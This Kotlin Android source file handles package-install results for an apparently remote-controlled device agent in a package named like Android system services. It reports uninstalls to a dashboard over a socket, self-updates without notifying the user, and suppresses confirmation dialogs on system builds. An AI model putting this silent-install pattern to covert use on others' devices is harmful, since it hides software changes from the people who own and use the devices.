package com.android.systemservices

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInstaller
import android.util.Log
import java.io.File

class InstallResultReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
        val msg    = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: ""
        val action = intent.getStringExtra("action") ?: "install"
        val pkg    = intent.getStringExtra("package") ?: ""

        // Uninstall result — route back to dashboard and exit; don't touch install-update logic.
        if (action == "uninstall") {
            val success = status == PackageInstaller.STATUS_SUCCESS
            Log.i(TAG, "Uninstall result: pkg=$pkg success=$success status=$status msg=$msg")
            SocketManager.emit("uninstall_result", org.json.JSONObject().apply {
                put("package", pkg)
                put("success", success)
                if (!success && msg.isNotEmpty()) put("error", msg)
            })
            return
        }

        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                Log.i(TAG, "APK update installed successfully")
                // Clear the boot-time self-healing record: the new version is now the
                // "truth" in packages.xml — no pending recovery needed.
                clearPendingRecord(context)

                val isSystemApp = context.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0
                if (isSystemApp) {
                    // ── Priv-app (system) path ───────────────────────────────────────────
                    // The APK sits in /system/priv-app/ — the OS must reboot to reload it.
                    // DO NOT call Process.killProcess() here — AMS would restart the process
                    // with the CACHED (pre-install) APK path (new random /data/app/~~hash==/)
                    // which no longer exists → Resources NPE crash loop.
                    // Instead: set the reboot-pending flag and start a 5-minute countdown;
                    // pm.reboot(null) at t=0 triggers a clean OS reboot so PMS re-reads
                    // packages.xml fresh and loads the correct new APK path.
                    try {
                        context.getSharedPreferences("ft_prefs", android.content.Context.MODE_PRIVATE)
                            .edit()
                            .putBoolean("ota_reboot_pending",    true)
                            .putBoolean("ota_reboot_delay_used", false)
                            .putLong("ota_reboot_delay_until",   0L)
                            .commit()
                        Log.i(TAG, "OTA flag committed (priv-app path) — starting reboot countdown")
                    } catch (_: Exception) {}
                    OtaRebootManager.checkAndSchedule(context)
                } else {
                    // ── Device Owner (non-system) path ───────────────────────────────────
                    // PackageInstaller installs into /data/app/ and AMS restarts this
                    // process automatically with the new code — no OS reboot needed.
                    // Silent: the agent does NOT show a notification on self-update.
                    Log.i(TAG, "DO self-update applied — process restarts silently, no notification")
                }
            }

            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // On system/root builds this should never fire now that INSTALL_PACKAGES
                // is declared in the manifest and granted by privapp-permissions-sentinel.xml.
                // On Device Owner builds it should also never fire since DO bypasses the check.
                // Keep the fallback for unexpected edge cases (e.g. first boot before the
                // privapp-permissions file has been applied).
                val isSystemApp = context.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0
                if (isSystemApp) {
                    // System app: log and do NOT launch the UI — the dialog would be
                    // alarming and confusing on a managed device.  The self-healing
                    // mechanism in BootReceiver will retry on the next reboot.
                    Log.e(TAG, "STATUS_PENDING_USER_ACTION on system build — " +
                            "INSTALL_PACKAGES may not be granted yet. Will retry at next boot.")
                } else {
                    @Suppress("DEPRECATION")
                    val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                    confirmIntent?.let {
                        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(it)
                    }
                }
            }

            else -> Log.e(TAG, "APK install failed: status=$status msg=$msg")
        }
    }

    /**
     * Remove the pending APK file and version-code record from SharedPrefs.
     * Called on STATUS_SUCCESS so BootReceiver knows no recovery is needed on
     * the next reboot.
     */
    private fun clearPendingRecord(context: Context) {
        try {
            val pendingFile = File(context.filesDir, AppUpdater.PENDING_APK_FILENAME)
            if (pendingFile.exists()) {
                pendingFile.delete()
                Log.i(TAG, "Deleted pending APK (install confirmed)")
            }
            Prefs(context).pendingUpdateVersionCode = 0L
        } catch (e: Exception) {
            Log.w(TAG, "clearPendingRecord error: ${e.message}")
        }
    }

    companion object { private const val TAG = "InstallResultReceiver" }
}
